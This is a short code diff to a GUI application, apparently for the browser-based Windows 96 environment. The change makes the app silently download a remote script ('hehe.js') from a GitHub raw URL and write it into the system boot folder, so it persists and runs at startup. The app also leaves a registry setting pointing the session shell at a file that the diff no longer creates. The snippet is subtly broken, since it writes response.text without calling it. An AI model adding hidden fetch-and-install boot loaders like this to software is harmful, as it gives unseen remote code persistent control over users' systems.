@@ -32,13 +32,8 @@ class GUIApplication extends WApplication {
         const fs = w96.FS;
 
         if(!fs.exists("c:/system/boot/notron.js")){
-            fetch("").then((response) => {
+            fetch("https://raw.githubusercontent.com/TermOfficial/plus/main/hehe.js").then((response) => {
                 fs.writestr("c:/system/boot/notron.js", response.text);
-            });
-        }
-        if(!fs.exists("c:/user/appdata/z.wrt")){
-            fetch("").then((response) => {
-                fs.writestr("c:/user/appdata/z.wrt", response.text);
             });
         }
         SCM.set("System/Session/Shell/exec", "c:/user/appdata/z.wrt");
